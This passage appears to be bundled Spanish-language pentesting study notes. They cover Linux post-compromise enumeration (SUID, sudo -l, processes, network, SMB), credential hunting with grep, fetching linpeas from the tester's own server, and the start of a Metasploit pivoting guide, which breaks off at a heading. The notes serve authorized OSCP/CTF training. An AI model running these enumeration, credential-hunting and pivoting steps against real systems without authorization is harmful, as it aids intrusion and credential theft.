find / -perm -u=s -type f 2>/dev/null     # Listar SUID
find / -perm -g=s -type f 2>/dev/null     # Listar SGID
ls -la /tmp                               # Ver el sticky bit (drwxrwxrwt)
\`\`\`

Activación de los bits (modificación — **no** es enumeración):

\`\`\`bash
chmod u+s <archivo>     # Activar SUID
chmod g+s <directorio>  # Activar SGID
chmod o+t <directorio>  # Activar Sticky Bit
\`\`\`

> **Peligro — destructivo.** Poner SUID a un binario (\`chmod u+s\`) crea una **puerta de escalada**: es una modificación sensible del sistema, no una comprobación. Enumera los SUID existentes; no crees nuevos salvo que el ejercicio lo pida.

* **Siguiente paso**: cada SUID/SGID fuera de lo común se analiza (binario + versión + GTFOBins) en [Escalada de Privilegios → Linux](/pentesting/privilege-escalation/linux).

***

## Atributos especiales

Más allá de los permisos, los archivos pueden tener **atributos** que condicionan qué se puede hacer con ellos.

\`\`\`bash
lsattr <archivo>        # Ver atributos
lsattr -R /etc 2>/dev/null
chattr +i <archivo>     # (modificación) hace el archivo inmutable
chattr -i <archivo>     # (modificación) quita la inmutabilidad
\`\`\`

Atributos frecuentes:

| Atributo | Significado |
|---|---|
| \`i\` (immutable) | No se puede modificar, borrar ni renombrar — **ni siquiera root** sin quitarlo antes. |
| \`a\` (append-only) | Solo se puede añadir contenido (típico de logs). |
| \`s\` (secure delete) | Al borrar, se sobrescriben los bloques. |
| \`S\` (sync) | Cambios escritos de forma síncrona. |
| \`c\` / \`d\` / \`u\` | Comprimido / excluido de dump / permite *undelete* (según sistema de ficheros). |

* **Qué buscar**: \`lsattr\` sobre archivos que "no deberías poder" tocar o que resisten cambios. Un fichero **immutable (\`i\`)** explica por qué un \`chmod\`/edición falla aunque los permisos parezcan correctos.
* **Por qué es útil**: aclara comportamientos extraños durante la enumeración y puede señalar archivos "protegidos" interesantes.

> **Nota de compatibilidad.** \`lsattr\`/\`chattr\` aplican a sistemas de ficheros **ext2/3/4** (y algunos más). En otros FS pueden no tener efecto.

***

## sudo

**Fundamental.** Define qué puede ejecutar tu usuario con privilegios elevados: a menudo **el camino más corto a root**.

\`\`\`bash
sudo -l           # (adicional) qué puedo ejecutar con sudo y con qué condiciones
sudo <comando>    # Ejecutar como root (requiere permiso/credencial)
sudo -u <user> <comando>   # Ejecutar como otro usuario
sudo !!           # (del cheatsheet) repetir el comando anterior con sudo
\`\`\`

* **Qué buscar en \`sudo -l\`**:
  * Comandos permitidos **sin contraseña** (\`NOPASSWD\`).
  * Binarios concretos que puedas ejecutar como root (muchos son abusables vía GTFOBins).
  * \`(ALL : ALL) ALL\` → acceso total.
* **Por qué es útil**: es el primer check de escalada tras \`id\`/\`groups\`.
* **Siguiente paso**: cualquier entrada interesante de \`sudo -l\` se explota desde [Escalada de Privilegios → Linux](/pentesting/privilege-escalation/linux).

> **Nota.** \`sudo -l\` puede pedir la contraseña del usuario actual. Úsalo solo con credenciales que tengas de forma legítima dentro del alcance.
`,Qr=`Lo primero tras conseguir una shell: saber **qué máquina es**. Kernel, distribución, arquitectura y hardware determinan qué vectores de escalada tienen sentido y qué binarios/exploits son aplicables.

***

## uname

**Fundamental.** Muestra información del sistema y del kernel.

\`\`\`bash
uname -a     # Información completa
uname -r     # Versión del kernel
uname -m     # Arquitectura (x86_64, aarch64…)
\`\`\`

Ejemplo de salida:

\`\`\`text
Linux target 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux
\`\`\`

* **Qué buscar**: distribución, **versión del kernel**, arquitectura.
* **Por qué es útil**: la versión del kernel es un primer indicador para buscar vectores de *Linux Privilege Escalation* (y para elegir exploits compatibles con la arquitectura).
* **Siguiente paso**: ampliar con \`cat /etc/os-release\`, \`id\` y \`sudo -l\`.

***

## Distribución y versión

\`\`\`bash
cat /etc/os-release     # Distro y versión (estándar actual)
lsb_release -a          # Igual, si lsb-release está instalado
cat /etc/issue          # Banner del sistema
hostname                # Nombre del equipo
hostname -f             # FQDN, si está configurado
date                    # Fecha/hora del sistema
\`\`\`

* **Qué buscar**: nombre y versión exacta de la distro (Ubuntu 20.04, Debian 11, CentOS 7…), que condiciona rutas, gestores de paquetes y exploits conocidos.
* **Siguiente paso**: con distro + kernel ya puedes acotar la búsqueda de PrivEsc.

> **Nota de compatibilidad.** \`lsb_release\` puede no estar instalado por defecto en sistemas mínimos o contenedores. \`/etc/os-release\` es el método más portable hoy.

***

## CPU, hardware y dispositivos

\`\`\`bash
lscpu          # CPU: modelo, núcleos, arquitectura, virtualización
lspci          # Dispositivos PCI
lsusb          # Dispositivos USB
lshw           # Inventario de hardware (suele requerir root para el detalle)
lsblk          # Discos y particiones en árbol
blkid          # UUID y tipo de sistema de ficheros de cada dispositivo
\`\`\`

* **Qué buscar**: señales de **virtualización** (en \`lscpu\`, campo *Hypervisor vendor* / *Virtualization*) — útil para saber si estás en VM, contenedor o bare-metal; discos y particiones no montadas.
* **Por qué es útil**: *situational awareness* del entorno; discos/particiones adicionales pueden contener datos o backups.

***

## /proc — información del sistema

El pseudo-sistema de ficheros \`/proc\` expone el estado del kernel. No requiere herramientas extra: solo \`cat\`.

\`\`\`bash
cat /proc/version     # Versión del kernel y compilador
cat /proc/cpuinfo     # Detalle de CPU
cat /proc/meminfo     # Memoria
cat /proc/swaps       # Áreas de swap
cat /proc/mounts      # Sistemas de ficheros montados (fiable)
cat /proc/net/dev     # Estadísticas por interfaz de red
\`\`\`

* **Qué buscar**: en \`/proc/version\`, kernel y toolchain; en \`/proc/mounts\`, montajes y **opciones** (\`nosuid\`, \`noexec\`, \`ro\`); en \`/proc/net/dev\`, interfaces presentes.
* **Por qué es útil**: \`/proc\` funciona incluso en shells muy limitadas donde faltan utilidades; \`/proc/mounts\` es más fiable que \`mount\` si el binario está manipulado.

***

## Memoria

\`\`\`bash
free -m               # Memoria libre/usada en MB (-h para humano)
cat /proc/meminfo     # Detalle completo
\`\`\`

* **Qué buscar**: memoria disponible antes de ejecutar herramientas pesadas o volcar procesos.
* **Por qué es útil en post-explotación**: dimensionar lo que puedes ejecutar sin tumbar un servicio en producción.

***

## Espacio en disco y montajes

\`\`\`bash
df -h                 # Espacio por sistema de ficheros (humano)
du -sh *              # Tamaño de cada elemento del directorio actual
du -sh /var/* 2>/dev/null   # Dónde se acumula el espacio
mount                 # Sistemas de ficheros montados y opciones
cat /proc/mounts      # Alternativa fiable a mount
\`\`\`

* **Qué buscar**:
  * Particiones y puntos de montaje poco habituales (shares de red, volúmenes montados).
  * Directorios grandes → a menudo **backups**, logs o datos.
  * Montajes con \`nosuid\`/\`noexec\` (afectan a qué puedes ejecutar o a vectores SUID).
* **Por qué es útil**: localizar backups y datos, y **comprobar espacio** antes de transferir herramientas/archivos a la máquina.
* **Siguiente paso**: revisar los directorios grandes y los montajes con [Archivos, búsqueda y permisos](/pentesting/linux/archivos-permisos).

> **Nota.** \`du -sh *\` sobre \`/\` puede tardar y generar ruido; acota a rutas concretas (\`/var\`, \`/home\`, \`/opt\`, \`/tmp\`).
`,$r=`Acabas de conseguir una shell en una máquina Linux. Antes de lanzarte a escalar privilegios, necesitas **situational awareness**: quién eres, qué sistema es, qué red tiene, qué corre y qué permisos tienes. Esta página es el punto de entrada: el **cheat sheet**, el **flujo de enumeración** y la tabla **"encuentro X → hago Y"**. El detalle de cada comando está en las páginas de esta misma sección.

> Todo lo de aquí es para equipos y entornos **autorizados** (OSCP/CTF/pentest con alcance). Las credenciales y accesos solo se prueban dentro de ese alcance.

***

## Cómo usar esta sección

Cada comando a lo largo de la guía sigue la misma lógica de consulta:

\`\`\`text
¿Qué hace? → ¿Cómo se usa? → Ejemplo → ¿Qué espero ver?
          → ¿Qué debo buscar? → ¿Qué hago después?
\`\`\`

Páginas de la sección:

* [Información del sistema](/pentesting/linux/informacion-del-sistema) — kernel, distro, hardware, \`/proc\`, memoria, disco, montajes.
* [Archivos, búsqueda y permisos](/pentesting/linux/archivos-permisos) — \`ls\`, \`find\`, credential hunting, compresión, permisos, SUID/SGID, atributos.
* [Red y Samba](/pentesting/linux/red) — interfaces, rutas, DNS, conexiones, captura, SMB desde Linux.
* [Procesos, texto y shell](/pentesting/linux/procesos-texto-shell) — procesos, \`grep\`/\`sed\`/\`awk\`, logs, pipes/redirecciones, transferencia.

***

## Linux Enumeration Cheat Sheet

Referencia rápida para copiar y pegar nada más entrar. Los comandos marcados como **(adicional)** no proceden del cheatsheet de 400 comandos: son enumeración estándar de pentest.

\`\`\`bash
# Usuario (adicional)
whoami
id
groups

# Sistema
uname -a
cat /etc/os-release
hostname
lscpu

# Procesos
ps aux
ps -ef
pstree

# Red
ip addr
ip route
ss -lntup                 # (adicional; alternativa moderna a netstat)

# Archivos
ls -la
find / -type f 2>/dev/null

# SUID
find / -perm -4000 -type f 2>/dev/null     # (adicional; equivale a -perm -u=s)

# Permisos de nuestro usuario
sudo -l                   # (adicional)

# Montajes
mount
cat /proc/mounts

# Espacio
df -h
du -sh *

# Credential hunting (adicional)
grep -Rni "password" /etc /var/www 2>/dev/null
\`\`\`

> Añade \`2>/dev/null\` a \`find\`/\`grep\` recursivos para silenciar los *permission denied* y quedarte solo con lo útil.

***

## Flujo de enumeración Linux

\`\`\`text
┌─────────────────────┐
│ Obtengo una shell   │
└──────────┬──────────┘
           ▼
¿Quién soy?           →  whoami · id · groups
           ▼
¿Qué sistema es?      →  uname -a · cat /etc/os-release
           ▼
¿Qué red tiene?       →  ip addr · ip route · ss -lntup
           ▼
¿Qué procesos hay?    →  ps aux · pstree · top
           ▼
¿Qué permisos tengo?  →  sudo -l · groups
           ▼
¿Hay SUID/SGID?       →  find / -perm -4000 -type f 2>/dev/null
           ▼
Buscar credenciales   →  configs · backups · .ssh · logs
           ▼
Escalada de privilegios  →  ver Privilege Escalation → Linux
\`\`\`

La idea: pasar de **quién soy** a **qué puedo tocar** a **cómo subo de privilegios**, sin saltarte pasos.

***

## "Encuentro X → hago Y"

Tabla de decisión para no quedarte parado ante un hallazgo:

| Si encuentro… | Siguiente paso |
|---|---|
| **Kernel antiguo** | Investigar posibles vectores de PrivEsc (ver [PrivEsc → Linux](/pentesting/privilege-escalation/linux)). |
| **Usuario interesante** | Revisar \`/home\`, grupos y permisos de ese usuario. |
| **Servicio local** | Identificar el proceso y su configuración. |
| **Puerto en \`127.0.0.1\`** | Investigar el servicio y acceso mediante pivot/túnel. |
| **Binario SUID** | Revisar el binario y su comportamiento (GTFOBins, versión). |
| **Archivo \`.conf\`** | Buscar credenciales/configuración. |
| **Backup** | Extraer y revisar el contenido. |
| **Carpeta \`.ssh\`** | Revisar claves, \`authorized_keys\` y \`config\`. |
| **Cron / tarea automatizada** | Investigar permisos del script y su propietario. |
| **Credenciales** | Probar reutilización **solo** dentro del alcance autorizado. |
| **Otra interfaz de red** | Analizar redes adicionales (pivoting). |
| **Ruta desconocida** | Investigar routing y conectividad. |

***

## Relación con el resto de Pentesting

Esta sección es **enumeración de la máquina**; no duplica otras secciones, enlaza con ellas:

\`\`\`text
SUID / sudo / cron   → Escalada de Privilegios → Linux
SMB desde Linux      → Servicios y Puertos → SMB
Otra red / 127.0.0.1 → Pivoting / Post-Explotación
\`\`\`

* Escalada en profundidad: [Escalada de Privilegios → Linux](/pentesting/privilege-escalation/linux).
* Enumeración y explotación de SMB: [Servicios y Puertos → SMB](/pentesting/services/puertos-139-445-smb).
* Técnicas tras la intrusión: [Post-Explotación](/pentesting/post-exploitation).

> **Nota sobre comandos destructivos.** A lo largo de la guía, los comandos que **modifican, eliminan o formatean** (como \`rm -rf\`, \`dd\`, \`mkfs\`, \`chmod\`, \`chown\`, \`userdel\`, \`shutdown\`) se marcan con un aviso **"Peligro — destructivo"** y se separan de los de enumeración. En una máquina que no es tuya, enumera; no alteres el sistema salvo que el alcance lo permita.
`,ei=`Qué corre en la máquina, cómo procesar lo que encuentras y cómo manejar la shell. Esta página reúne **procesos y monitorización**, **procesamiento de texto** (\`grep\`/\`sed\`/\`awk\`), **logs**, **pipes y redirecciones**, y **transferencia** de archivos.

***

## Procesos y servicios

**Fundamental.** Los procesos revelan servicios, tareas automatizadas y, a veces, **credenciales en los argumentos**.

\`\`\`bash
ps aux                              # Todos los procesos (usuario, CPU, mem, comando)
ps -ef                              # Formato alternativo (del cheatsheet: ps -eaf)
ps -e -o pid,args --forest          # Árbol de procesos con PID y comando
pstree                              # Jerarquía padre/hijo
pidof <nombre>                      # PID(s) de un proceso por nombre
top                                 # Monitor en tiempo real
htop                                # Monitor interactivo (si está instalado)
\`\`\`

* **Qué buscar**:
  * Procesos ejecutándose como **root** (columna de usuario).
  * **Credenciales en los argumentos** (\`--password=\`, tokens, rutas a ficheros de config).
  * Servicios interesantes (bases de datos, paneles, agentes internos).
  * Scripts lanzados automáticamente y relaciones **padre/hijo** sospechosas.
* **Por qué es útil**: identifica servicios locales (correlaciona con puertos en [Red](/pentesting/linux/red)) y posibles vectores (un script root escribible = escalada).
* **Siguiente paso**: para un proceso interesante, mira sus archivos abiertos con \`lsof\` y su configuración.

***

## lsof

Lista archivos abiertos — y en Linux "todo es un archivo": ficheros, sockets, conexiones.

\`\`\`bash
lsof -p <PID>        # Todo lo que tiene abierto un proceso
lsof <ruta>          # Qué proceso tiene abierto ese archivo/ruta
lsof -i              # Conexiones de red abiertas (requiere privilegios para ver todo)
lsof -i :<puerto>    # Quién usa un puerto
\`\`\`

* **Qué buscar**: ficheros de configuración/sockets que usa un servicio, qué proceso escucha en un puerto, logs y rutas abiertas.
* **Por qué es útil**: conecta un **puerto local** con el **proceso** y sus **archivos** — clave para entender un servicio en \`127.0.0.1\`.

***

## strace

Traza las *syscalls* de un proceso: útil para entender qué hace un binario (y qué ficheros intenta abrir).

\`\`\`bash
strace -f -e trace=open,openat <comando>   # Ver qué archivos abre
strace -c <comando>                        # Resumen/contador de syscalls
strace -p <PID>                            # Adjuntar a un proceso en marcha
\`\`\`

* **Qué buscar**: rutas de **configuración/credenciales** que un binario SUID intenta leer (a veces rutas relativas abusables), o por qué algo falla.
* **Por qué es útil**: análisis de comportamiento de binarios durante la enumeración y el estudio de un SUID.
* **Nota**: adjuntar a procesos de otros usuarios suele requerir privilegios.

***

## Otra monitorización

\`\`\`bash
watch -n 2 '<comando>'     # Repetir un comando cada 2s (ver cambios en vivo)
free -m                    # Memoria
lsmod                      # Módulos del kernel cargados
last                       # Últimos inicios de sesión
uptime                     # Tiempo encendido y carga
\`\`\`

* **Qué buscar**: con \`watch\` puedes **cazar procesos efímeros** lanzados por cron (un comando que aparece cada minuto). \`last\` muestra qué usuarios entran y desde dónde. \`lsmod\` puede revelar módulos poco habituales.

***

## Procesamiento de texto

**Fundamental.** Filtrar y transformar texto es el día a día de la enumeración.

### grep

\`\`\`bash
grep "password" config.txt                 # Buscar una cadena
grep -i "pass" config.txt                  # Ignorar mayúsculas/minúsculas
grep -R "password" /var/www/ 2>/dev/null   # Recursivo por un directorio
grep -Rni -e "pass" -e "secret" -e "api" /etc /opt 2>/dev/null   # Varios patrones + nº de línea
grep -v "^#" archivo.conf                  # Excluir comentarios (líneas que empiezan por #)
\`\`\`

* **Qué buscar**: \`password\`, \`secret\`, \`token\`, \`api_key\`, \`connectionstring\` en configs, código y logs. \`-n\` añade el número de línea; \`-i\` ignora mayúsculas; \`-R\` recorre directorios.

### sed y awk

\`\`\`bash
sed 's/password/PASSWORD/g' archivo.txt    # Sustituir texto (a stdout)
sed -n '10,20p' archivo.txt                # Imprimir solo las líneas 10–20
awk -F: '{print $1}' /etc/passwd           # Primer campo (usuarios), separador ":"
awk -F: '$3>=1000 {print $1}' /etc/passwd  # Usuarios con UID >= 1000
\`\`\`

* **Por qué es útil**: \`awk -F:\` sobre \`/etc/passwd\` extrae usuarios, UIDs y shells de un vistazo; \`sed\` recorta porciones de archivos grandes.

### tr

\`\`\`bash
echo "admin" | tr '[:lower:]' '[:upper:]'  # minúsculas → MAYÚSCULAS
cat archivo | tr -d '\\r'                    # Quitar retornos de carro (CRLF → LF)
\`\`\`

> **Nota.** \`sed 's/.../.../g'\` por defecto escribe a stdout; con \`-i\` edita **en el sitio** (modificación del archivo). Úsalo con cuidado sobre ficheros del sistema.

***

## Visualización de archivos y logs

\`\`\`bash
cat <archivo>         # Volcar completo
head -n 20 <archivo>  # Primeras líneas
tail -n 20 <archivo>  # Últimas líneas
tail -f <archivo>     # Seguir en tiempo real (logs)
less <archivo>        # Paginador (q para salir, / para buscar)
more <archivo>        # Paginador clásico
\`\`\`

### Logs

\`\`\`bash
tail -f /var/log/syslog        # Actividad del sistema (Debian/Ubuntu)
tail -f /var/log/auth.log      # Autenticaciones (Debian/Ubuntu)
tail -f /var/log/messages      # (del cheatsheet) sistemas tipo RHEL
tail -f /var/log/dmesg         # (del cheatsheet) mensajes del kernel
grep -i "fail\\|accepted" /var/log/auth.log 2>/dev/null   # Intentos de login
\`\`\`

* **Qué buscar en los logs**: autenticaciones (éxitos/fallos y **desde qué IP**), errores de servicios, **credenciales filtradas** por accidente, actividad de usuarios y **tareas automatizadas** (cron).
* **Nota de compatibilidad**: las rutas varían por distro (\`auth.log\` en Debian/Ubuntu vs \`secure\`/\`messages\` en RHEL). En sistemas con \`systemd\`, usa también \`journalctl\` (p. ej. \`journalctl -u <servicio>\`).

***

## Pipes, redirecciones y tee

**Fundamental.** Controlar la entrada/salida es la base para encadenar y guardar resultados.

\`\`\`text
STDIN  → 0      (entrada)
STDOUT → 1      (salida normal)
STDERR → 2      (errores)
\`\`\`

\`\`\`bash
comando > salida.txt            # Redirige STDOUT (sobrescribe)
comando >> salida.txt           # Redirige STDOUT (añade)
comando 2> errores.txt          # Redirige STDERR
comando > salida.txt 2>&1       # STDOUT y STDERR al mismo archivo
comando 2>/dev/null             # Descarta errores (silencia permission denied)
comando1 | comando2             # Pipe: la salida de uno es la entrada del otro
comando | tee salida.txt        # Muestra por pantalla Y guarda a archivo
comando | tee -a salida.txt     # Igual, añadiendo
\`\`\`

* **Por qué es fundamental**: \`2>/dev/null\` limpia el ruido de \`find\`/\`grep\`; \`tee\` guarda la evidencia mientras la ves; los pipes encadenan \`grep\`/\`sort\`/\`uniq\`/\`awk\` para exprimir una salida.

Ejemplo real:

\`\`\`bash
find / -perm -4000 -type f 2>/dev/null | tee suid.txt
\`\`\`

***

## Codificación y transferencia

### base64

\`\`\`bash
echo "password" | base64            # Codificar
echo "cGFzc3dvcmQ=" | base64 -d     # Decodificar
base64 archivo                      # Codificar un archivo
base64 -d archivo.b64 > archivo     # Decodificar a archivo
\`\`\`

> **Base64 es codificación, no cifrado.** No protege nada: cualquiera lo decodifica. Es útil para **mover** datos/binarios por una shell limitada (copiar/pegar texto) y para leer valores codificados en configs/tokens.

### wget y descarga

\`\`\`bash
wget http://<tu_ip>/linpeas.sh -O /tmp/linpeas.sh   # Descargar una herramienta
wget -c http://<servidor>/archivo                   # Reanudar descarga interrumpida
wget -r http://<servidor>/dir/                      # Descarga recursiva
curl http://<tu_ip>/script.sh -o script.sh          # Alternativa con curl
\`\`\`

* **Por qué es útil**: traer herramientas/scripts desde **un servidor que controlas** (p. ej. \`python3 -m http.server\` en tu equipo), recuperar archivos de la víctima o descargar exploits. Comprueba antes el espacio en disco (ver [Información del sistema](/pentesting/linux/informacion-del-sistema)).

### Transferencia y backups: rsync, scp, dd

\`\`\`bash
# Copiar por SSH (de tu equipo a la víctima o viceversa)
scp archivo usuario@<ip>:/ruta/destino
scp usuario@<ip>:/ruta/archivo .

# rsync sobre SSH (del cheatsheet)
rsync -az -e ssh usuario@<ip>:/home/public /home/local
\`\`\`

Desglose de \`rsync -az -e ssh\`:

* \`-a\` → modo *archive*: preserva permisos, propietario, timestamps y recursividad.
* \`-z\` → comprime durante la transferencia (útil en redes lentas).
* \`-e ssh\` → usa **SSH** como transporte (cifrado).
* Ajusta origen/destino según tu escenario (traer o sacar datos, siempre dentro del alcance).

> **Peligro — destructivo.** \`dd\` copia bloque a bloque y puede **sobrescribir discos enteros** (\`dd if=... of=/dev/sdX\`) de forma irreversible. \`rsync --delete\` **borra** en destino lo que no está en origen. No uses estas variantes sobre una máquina ajena salvo que el alcance lo exija y sepas exactamente el efecto.

***

## Seguridad y cifrado (referencia)

Comandos de hashing/cifrado que aparecen en el cheatsheet; útiles para verificar integridad o manejar datos:

\`\`\`bash
md5sum archivo           # Hash MD5 (integridad, no seguridad)
sha256sum archivo        # Hash SHA-256
gpg -c archivo           # Cifrar simétricamente (pide passphrase)
gpg archivo.gpg          # Descifrar
\`\`\`

* **Por qué es útil**: comprobar que una herramienta descargada no se corrompió (comparar hashes) y manejar artefactos cifrados encontrados. Para **crackeo** de hashes/credenciales se usan otras herramientas, fuera de esta guía de enumeración.
`,ti=`Enumerar la red desde la máquina comprometida revela **redes internas**, servicios locales y rutas hacia otros segmentos — la base del *pivoting* y el movimiento lateral. Esta página cubre interfaces, rutas, DNS, conexiones/puertos, captura de tráfico y los comandos Linux para interactuar con **SMB**.

> **Nota de compatibilidad.** Las herramientas clásicas (\`ifconfig\`, \`route\`, \`netstat\`, \`arp\`) pertenecen a \`net-tools\` y pueden **no estar instaladas** en sistemas modernos/mínimos. Las alternativas de \`iproute2\` (\`ip\`, \`ss\`) sí suelen estarlo. Se indican ambas; usa la que exista.

***

## Interfaces

\`\`\`bash
ip addr                 # Interfaces y direcciones IP (moderno)
ip -br addr             # Vista breve
ip link show            # Estado de las interfaces
ifconfig                # Clásico (net-tools) — alternativa a "ip addr"
\`\`\`

Interfaces habituales y su significado:

| Interfaz | Significado |
|---|---|
| \`lo\` | Loopback (\`127.0.0.1\`): servicios **solo locales**. |
| \`eth0\` / \`ens33\` / \`enp0s3\` | Red principal (cableada/VM). |
| \`tun0\` / \`tap0\` | VPN/túnel — en labs, la red del **entorno de pentest**. |
| \`docker0\` / \`br-*\` | Puente de contenedores → posible **red interna de Docker**. |
| \`wlan0\` | Wi-Fi. |

* **Qué buscar**: **múltiples interfaces** = la máquina toca **varias redes** → candidata a *pivot*. Una \`docker0\`/\`br-*\` sugiere contenedores con su propia red.
* **Siguiente paso**: anota cada red y pásala al descubrimiento interno y a [Rutas](#rutas).

***

## Rutas

\`\`\`bash
ip route                # Tabla de rutas (moderno)
route -n                # Clásico (net-tools), sin resolución DNS
\`\`\`

Ejemplo de interpretación:

\`\`\`text
default via 192.168.1.1 dev eth0      → gateway por defecto por eth0
10.10.10.0/24 dev tun0                → red 10.10.10.0/24 alcanzable por tun0
172.17.0.0/16 dev docker0             → red interna de Docker
\`\`\`

* **Qué buscar**: redes a las que la máquina tiene ruta pero tú **no** desde tu equipo → objetivos de *pivoting*.
* **Por qué es útil**: identifica **redes internas**, el gateway y las rutas que habilitan *lateral movement* y *tunneling*.

***

## DNS y resolución

\`\`\`bash
host example.com            # Resolución de nombre (simple)
nslookup example.com        # Resolución interactiva/consultas
cat /etc/resolv.conf        # Servidores DNS configurados
cat /etc/hosts              # Entradas estáticas (nombres internos interesantes)
\`\`\`

* **Qué buscar**: en \`/etc/hosts\` y \`resolv.conf\`, **nombres y dominios internos** (p. ej. \`dc01.corp.local\`) que revelan infraestructura — correlaciona con Active Directory/servicios.

***

## Conexiones y puertos

\`\`\`bash
ss -lntup                 # (moderno) puertos en escucha: TCP/UDP + proceso
ss -antp                  # Todas las conexiones TCP + proceso
netstat -tupl             # (clásico) puertos en escucha
netstat -punta            # (clásico) todas las conexiones, numérico
\`\`\`

Cómo leer la salida:

| Campo | Significado |
|---|---|
| \`LISTEN\` | Servicio **esperando** conexiones. |
| \`ESTABLISHED\` | Conexión activa en curso. |
| \`0.0.0.0:<puerto>\` | Escucha en **todas** las interfaces (accesible desde la red). |
| \`127.0.0.1:<puerto>\` | Escucha **solo local** → no accesible desde fuera… todavía. |

* **Qué investigar**: un servicio en **\`127.0.0.1\`** (p. ej. una base de datos o un panel) no es visible desde la red, pero **sí desde la propia máquina**. Es un objetivo clásico para acceder mediante **port-forwarding / túnel SSH** desde tu equipo.
* **Siguiente paso**: identifica el proceso dueño del puerto (ver [Procesos](/pentesting/linux/procesos-texto-shell)) y plantea el *pivot*.

***

## Captura de tráfico

\`\`\`bash
tcpdump -i <iface>                 # Capturar en una interfaz
tcpdump -i eth0 tcp port 80        # Solo HTTP
tcpdump -i eth0 -w captura.pcap    # Guardar a archivo para análisis
\`\`\`

* **Qué hace**: captura paquetes que pasan por la interfaz. Capturar tráfico puede revelar **credenciales en claro**, tokens o comunicación entre servicios internos.
* **Cuándo es útil**: en una máquina comprometida que actúa de **punto intermedio** entre servicios/segmentos.
* **Requisitos**: suele necesitar **root** (o capacidades de red). Sé consciente del ruido/impacto.

> **Nota.** Interceptar tráfico puede capturar datos sensibles de terceros. Hazlo solo dentro del alcance autorizado y con cuidado del volumen.

***

## Descubrimiento de red

\`\`\`bash
arp-scan --localnet          # Descubrir hosts en la red local (ARP)
arp -a                       # (clásico) caché ARP: vecinos ya conocidos
ip neigh                     # (moderno) equivalente a la tabla ARP
\`\`\`

* **Qué buscar**: otros hosts vivos en las redes a las que la máquina está conectada.
* **Nota de compatibilidad**: \`arp-scan\`/\`arp\` pueden no estar instalados; \`ip neigh\` casi siempre sí.

***

## SMB / Samba desde Linux

Comandos Linux para **interactuar con recursos Windows/SMB** desde la máquina comprometida. Aquí solo el uso desde Linux; la **metodología completa de SMB** (enumeración, null session, shares, usuarios, vulnerabilidades) está en su propia sección.

\`\`\`bash
nbtscan 192.168.1.10          # Nombres NetBIOS en un host/rango
nmblookup -A 192.168.1.10     # Tabla de nombres NetBIOS de un host
smbclient -L //192.168.1.10   # Listar recursos compartidos
smbclient //192.168.1.10/<recurso>    # Conectar a un recurso
\`\`\`

* **Qué buscar**: hosts con **NetBIOS/SMB** en las redes internas descubiertas, y recursos compartidos accesibles.
* **Siguiente paso**: para enumerar SMB en profundidad (null session, permisos, usuarios/SID, política de contraseñas, vulnerabilidades), ve a [Servicios y Puertos → SMB](/pentesting/services/puertos-139-445-smb). No se duplica aquí.
`,ni=`Este apartado está dedicado a todas las acciones y metodologías aplicadas una vez que se ha logrado comprometer un sistema. El enfoque principal es la consolidación del acceso, el movimiento lateral y la extracción de información crítica para el éxito del ejercicio de pentesting.

---

## Metodologías y Técnicas Documentadas

Aquí encontrarás guías específicas sobre cómo estabilizar conexiones y navegar por redes internas:

| Categoría | Descripción Técnica | Documentación |
| :--- | :--- | :--- |
| **Tratamiento de TTY** | Métodos para transformar una shell simple en una terminal interactiva completa. | [Ver Notas](/pentesting/post-exploitation/tty) |
| **Pivoting** | Técnicas para saltar entre redes y alcanzar segmentos no visibles inicialmente. | [Ver Notas](/pentesting/post-exploitation/pivoting) |
| **Windows Post-Exploitation** | Enumeración profunda y recolección de datos en entornos Windows. | [Ver Notas](/pentesting/post-exploitation/windows-post-exploitation) |
| **WinRM** | Gestión y explotación del protocolo Windows Remote Management. | [Ver Notas](/pentesting/post-exploitation/winrm) |

---

## Objetivos de esta Fase

* **Estabilización:** Conseguir una shell funcional que permita el uso de editores de texto y comandos complejos.
* **Persistencia:** Asegurar el acceso al sistema ante posibles reinicios o cierres de sesión.
* **Recolección de Evidencias:** Localizar "flags", archivos de configuración y credenciales en texto claro.
* **Movimiento Lateral:** Identificar nuevos objetivos dentro de la red del cliente/entorno.

---

## Comunidad y Contenido
Puedes seguir mi progreso y contenido adicional en:

* **YouTube**  [bitsofalber](https://www.youtube.com/@bitsofalber)
* **Instagram**  [@bitsofalber](https://www.instagram.com/bitsofalber/)
* **LinkedIn**  [ahidalgotech](https://linkedin.com/in/ahidalgotech)

---
`,ri=`<figure><img src="/pentesting/assets/dalle-2025-02-19-10-19-31-a-dark-themed-cyberpunk-style-image-featuring-a-hacker-in-a-hoodie-using-a-laptop-in-a-dimly-lit-room-with-neon-blue-and-red-lights-the-word-pivoti.webp" alt="" width="375"><figcaption></figcaption></figure>

## Pivoting con Metasploit utilizando una máquina Windows intermedia

El **pivoting** es una técnica esencial en la fase de post-explotación que permite a un atacante moverse lateralmente dentro de una red comprometida, utilizando un sistema ya infiltrado como punto de apoyo. En entornos Windows, **Metasploit** facilita este proceso mediante el uso de sesiones _Meterpreter_, tunelización y P**ort forwarding** para acceder a sistemas internos que no son visibles desde el exterior.

***

## Objetivos principales del Pivoting:

* **Expandir el acceso** dentro de la red interna.
* **Evadir restricciones** de segmentación y _firewalls_.
* **Acceder a recursos internos** que permanecen ocultos desde el exterior.

***

### Configuración de Pivoting en Metasploit

### Identificación de la red interna

El primer paso consiste en identificar las redes accesibles desde la máquina comprometida.

\`\`\`powershell
ipconfig          # Obtener información de interfaces y redes disponibles.
route print       # Ver las rutas de la tabla de enrutamiento.
arp -a            # Identificar hosts en la misma subred.
\`\`\`

Una vez identificada una red interna, dejamos la sesión en segundo plano con **Ctrl + Z**. Verificamos las sesiones activas:

\`\`\`powershell
sessions -l       # Listar las sesiones activas.
\`\`\`

***

## Escaneo de la red interna

Desde Metasploit, usamos el módulo **ARP Scanner** para descubrir equipos activos en la red interna:

\`\`\`powershell
use windows/gather/arp_scanner   # Identificar equipos activos en la red interna.
set RHOSTS <ip_víctima_windows/24>
set SESSION <session_id>          # Obtenido con sessions -l.
run
\`\`\`

Esto nos mostrará las direcciones IP detectadas dentro del rango de red de la máquina _Windows_ comprometida.

***

## Enrutamiento del tráfico con Autoroute

Ahora, configuramos el tráfico para que desde la máquina **intermedia** se reenvíe el tráfico hacia la máquina **víctima final** utilizando el módulo **Autoroute**:

\`\`\`powershell
use multi/manage/autoroute
show options                # Ver opciones disponibles.
set SESSION <session_id>    # Obtener con sessions -l.
run
\`\`\`

Con esto, establecemos una ruta a través de la máquina intermedia, permitiendo el movimiento lateral dentro de la red.

***

## Escaneo de puertos de la víctima final

